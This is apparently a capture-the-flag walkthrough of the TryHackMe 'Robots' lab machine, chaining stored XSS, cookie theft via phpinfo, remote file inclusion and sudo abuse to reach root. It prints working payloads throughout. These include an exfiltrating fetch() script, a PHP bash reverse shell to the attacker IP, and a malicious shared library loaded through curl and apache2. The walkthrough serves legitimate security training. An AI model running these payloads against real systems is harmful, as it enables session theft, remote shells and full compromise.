---
tags:
  - THM
  - Linux
  - Hard
  - XSS
  - Cookie-HJ
  - SSRF
  - RFI
  - RCE
  - Docker
  - Scripting
  - Brute-Force
  - Sudo
---
# Information

- Machine: [Robots](https://tryhackme.com/room/robots)
- Target: `10.66.159.17`
- Attacker: `192.168.131.62`

# Enumeration

## Ports

Scanned all TCP ports:

```console
$ sudo nmap -p- --open -sS -Pn -n 10.66.159.17
...
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
9000/tcp open  cslistener
```

Service version detection for open ports:

```console
$ nmap -p22,80,9000 -sV 10.66.159.17
...
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.61
9000/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
Service Info: Host: robots.thm
```

Append to the `/etc/hosts` file:

```text
10.66.159.17 robots.thm
```

## Web

Found `robots.txt` with the next disabled entries:

```text
Disallow: /harming/humans
Disallow: /ignoring/human/orders
Disallow: /harm/to/self
```

The previous entries returned 403 forbidden status except for `/harm/to/self`:

```console
$ curl -s 'http://robots.thm/harm/to/self/' | html2text

#### Recruitment campaign: register here and login

An admin monitors new users.

[Register here](register.php)

[Login](login.php)
```

An unnaccessible **admin panel** was found:

```console
$ ffuf -u 'http://robots.thm/harm/to/self/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt
...
admin.php               [Status: 200, Size: 370, Words: 29, Lines: 28, Duration: 92ms]
config.php              [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 96ms]
logout.php              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 96ms]
.htaccess               [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 94ms]
.                       [Status: 200, Size: 662, Words: 99, Lines: 35, Duration: 100ms]
login.php               [Status: 200, Size: 795, Words: 125, Lines: 36, Duration: 3972ms]
register.php            [Status: 200, Size: 976, Words: 155, Lines: 39, Duration: 3972ms]
.html                   [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 89ms]
index.php               [Status: 200, Size: 662, Words: 99, Lines: 35, Duration: 4990ms]
.htpasswd               [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 91ms]
.htm                    [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 92ms]
.htpasswds              [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 94ms]
.htgroup                [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 91ms]
.htaccess.bak           [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 91ms]
.htuser                 [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 93ms]
.ht                     [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 92ms]
.htc                    [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 92ms]
server_info.php         [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 91ms]
.htacess                [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 90ms]
.htaccess.old           [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 94ms]

$ curl -s 'http://robots.thm/harm/to/self/admin.php' | html2text
Not authorized.
```

The **default password format** is explained:

```console
$ curl -s 'http://robots.thm/harm/to/self/register.php' | html2text

#### Register here

An admin monitors new users. Your initial password will be
**md5(username+ddmm)**

username

date of birth
```

We also now know that an **admin** actively checks for new users.

After creating **test** user, born on **11/11/2222**, logged in with its password:

```console
$ printf 'test1111' | md5sum

51ce84a6db96daaa7081869fd38c517a  -
```

The endpoint `/harm/to/self/index.php` shows the stored **test** username:

```markdown
[Server info](server_info.php)

#### Last logins

[Logout](logout.php)

Admin last login: 2026-10-25 00:56  User 3 - test last logins | 2026-10-25 01:29  
---
```

At `/harm/to/self/server_info.php`, the `phpinfo()` is being executed and reports no disabled PHP functions.

# Exploitation

## XSS

Logged out and created username `<script src="http://192.168.131.62:8000/s.js"></script>`, born on **11/11/2222**.

Logged in with its password:

```console
$ printf '<script src="http://192.168.131.62:8000/s.js"></script>1111' | md5sum

c398c1ac434c1ddf5464e5d6535dae5b  -
```

By checking the source code, verified that the HTML tag was correctly inserted:

```html
<th>User 4 - <script src="http://192.168.131.62:8000/s.js"></script> last logins</th>
```

An **admin** robot checks the website between some time intervals:

```console
$ sudo python3 -m http.server 8000
...
10.66.159.17 - - [24/Oct/2026 19:57:53] code 404, message File not found
10.66.159.17 - - [24/Oct/2026 19:57:53] "GET /s.js HTTP/1.1" 404 -
10.66.159.17 - - [24/Oct/2026 19:57:53] code 404, message File not found
10.66.159.17 - - [24/Oct/2026 19:57:53] "GET /s.js HTTP/1.1" 404 -
```

Cookies are protected using **HttpOnly**, so can use JavaScript to steal them. However, we can leak **admin's cookie** using `phpinfo()` output. So, we host the next `s.js` file to steal it:

```javascript
fetch('/harm/to/self/server_info.php', { credentials: 'include' })
  .then(r => r.text())
  .then(d => {
    fetch('http://192.168.131.62:8001', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: d
    })
  })
```

Get the **cookie**:

```console
$ ncat -lvnp 8001 | grep 'PHPSESSID'
...
<tr><td class="e">$_SERVER['HTTP_COOKIE']</td><td class="v">PHPSESSID=h4v3don3916da8l49vqsspujsu</td></tr>
```

## SSRF

After setting `PHPSESSID=h4v3don3916da8l49vqsspujsu` cookie, the **admin panel** `/harm/to/self/admin.php` asks for a URL and tests it.

After sending `http://a` via POST request, the website shows the next error:

```text
Warning: include(): php_network_getaddresses: getaddrinfo for a failed: Temporary failure in name resolution in /var/www/html/harm/to/self/admin.php on line 40

Warning: include(http://a): Failed to open stream: php_network_getaddresses: getaddrinfo for a failed: Temporary failure in name resolution in /var/www/html/harm/to/self/admin.php on line 40

Warning: include(): Failed opening 'http://a' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/harm/to/self/admin.php on line 40
```

Since we are asked for a URL and using PHP's `include()` function, we test remote file inclusion by hosting `r.php`:

```php
<?php echo shell_exec("bash -c 'bash -i >& /dev/tcp/192.168.131.62/443 0>&1'"); ?>
```

Then, we send `http://192.168.131.62:8000/r.php` via POST while listening for connections:

```console
$ sudo ncat -lvnp 443
```

# Post-Exploitation

## Docker Database

We are in a docker container:

```console
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

$ grep 'sh$' /etc/passwd
root:x:0:0:root:/root:/bin/bash

$ hostname -I
172.18.0.3
```

Found some credentials at `/var/www/html/harm/to/self/config.php`:

```php
<?php
    $servername = "db";
    $username = "robots";
    $password = "q4qCz1OflKvKwK4S";
    $dbname = "web";
// Get the current hostname
$currentHostname = $_SERVER['HTTP_HOST'];

// Define the desired hostname
$desiredHostname = 'robots.thm';

// Check if the current hostname does not match the desired hostname
if ($currentHostname !== $desiredHostname) {
    // Redirect to the desired hostname
    header("Location: http://$desiredHostname" . $_SERVER['REQUEST_URI']);
    exit();
}
ini_set('session.cookie_httponly', 1);

session_start();

?>
```

There are no available SQL commands like `mysql`, `mariadb`, or `sqlite3` so the database must be stored somewhere else outside the container.

Check how the `/var/www/html/harm/to/self/login.php` connects to the database:

```php
<?php
include('config.php');

if ( isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true ) {
 header('Location: index.php');
 die();
}
        
$dsn="mysql:host=$servername;dbname=$dbname;charset=utf8mb4";

$options = [
    PDO::ATTR_ERRMODE            => PDO::ERRMODE_EXCEPTION,
    PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
    PDO::ATTR_EMULATE_PREPARES   => true,
          ];

$pdo = new PDO($dsn, $username, $password, $options);

if (isset($_POST['username'])&&isset($_POST['password'])) {
  
  
    $stmt = $pdo->prepare('SELECT * from users where (username= ? and password=md5(?) and `group` NOT LIKE "nologin")');

    $stmt->execute([$_POST['username'], $_POST['password']]);

    if ($stmt->rowCount() === 1 ) {
    $row=$stmt->fetch(); 
      $_SESSION['logged_in']=true;
      $_SESSION['username']=$_POST['username'];
    
      $stmt = $pdo->prepare('INSERT INTO logins values ( ?, NOW())');
      $stmt->execute([$_POST['username']]);
    
      header('Location: index.php');
      die();
    
  }
} 

?>
```

Using that same syntax, leak the users table:

```console
$ php -a
Interactive shell

php > include("/var/www/html/harm/to/self/config.php");
...
php > $dsn="mysql:host=$servername;dbname=$dbname;charset=utf8mb4";
php > $options = [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION, PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC, PDO::ATTR_EMULATE_PREPARES => true];
php > $pdo = new PDO($dsn, $username, $password, $options);
php > foreach($pdo->query("SELECT * FROM users") as $row) echo json_encode($row), PHP_EOL;
{"id":1,"username":"admin","password":"3e3d6c2d540d49b1a11cf74ac5a37233","group":"admin"}
{"id":2,"username":"rgiskard","password":"dfb35334bf2a1338fa40e5fbb4ae4753","group":"nologin"}
{"id":3,"username":"test","password":"94e0f6b7484482b893fbacbeea6d9fec","group":"guest"}
{"id":4,"username":"<script src=\"http:\/\/192.168.131.62:8000\/s.js\"><\/script>","password":"82a81d077af7b2853f1f3fcc35ede936","group":"guest"}
```

Based on the **password format**, create this `crack.py` file to find valid hashes:

```python
#!/usr/bin/python3

from hashlib import md5

def md5sum(string):
    return md5(string.encode()).hexdigest()

def main():
    for username in ('admin', 'rgiskard'):
        for day in range(1, 31):
            for month in range(1, 13):
                password = md5sum(f"{username}{day:02}{month:02}")
                password_hash = md5sum(password)

                if password_hash in ('3e3d6c2d540d49b1a11cf74ac5a37233', 'dfb35334bf2a1338fa40e5fbb4ae4753'):
                    print(f"{username}:{password}")


if __name__ == '__main__':
    main()
```

Found password for **rgiskard** which is valid via SSH:
```console
$ chmod +x crack.py

$ ./crack.py
rgiskard:b246f21ff68cae9503ed6d18edd32dae

$ ssh rgiskard@robots.thm
rgiskard@robots.thm's password:
```

## User Migration

Found valid users **vagrant** and **dolivaw**:

```console
$ id
uid=1002(rgiskard) gid=1002(rgiskard) groups=1002(rgiskard)

$ grep 'sh$' /etc/passwd
root:x:0:0:root:/root:/bin/bash
vagrant:x:1000:1000:,,,:/home/vagrant:/bin/bash
rgiskard:x:1002:1002::/home/rgiskard:/bin/bash
dolivaw:x:1003:1003::/home/dolivaw:/bin/bash
```

Can run `/usr/bin/curl` using `sudo` as **dolivaw**:

```console
$ sudo -l
[sudo] password for rgiskard:

Matching Defaults entries for rgiskard on ubuntu-jammy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User rgiskard may run the following commands on ubuntu-jammy:
    (dolivaw) /usr/bin/curl 127.0.0.1/*
```

So, we abuse it following [GTFOBins guide](https://gtfobins.org/gtfobins/curl/) for **library load**. First, create a malicious library on the attacker's machine:

```console
$ echo -e '#include <unistd.h>\n__attribute__((constructor)) void init(void) { execl("/bin/sh", "sh", 0); }' | gcc -w -fPIC -shared -o lib.so -x c -

$ python3 -m http.server 8000
...
```

Download the library and execute it using `/usr/bin/curl`:

```console
$ curl -so /tmp/lib.so 'http://192.168.131.62:8000/lib.so'

$ chmod 777 /tmp/lib.so

$ sudo -u dolivaw /usr/bin/curl 127.0.0.1/ --engine /tmp/lib.so x
```

As **dolivaw**, get the **user flag**:

```console
$ id
uid=1003(dolivaw) gid=1003(dolivaw) groups=1003(dolivaw)

$ cat /home/dolivaw/user.txt
```

## Privilege Escalation

User **dolivaw** can run `/usr/sbin/apache2` using `sudo`:

```console
$ sudo -l

Matching Defaults entries for dolivaw on ubuntu-jammy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User dolivaw may run the following commands on ubuntu-jammy:
    (ALL) NOPASSWD: /usr/sbin/apache2
```

Become **root** by loading previous malicious library:

```console
$ sudo /usr/sbin/apache2 -C 'Define APACHE_RUN_DIR /' -C 'LoadModule shell /tmp/lib.so'

# whoami
root
```

Get the **root flag**:

```console
# cat /root/root.txt
```
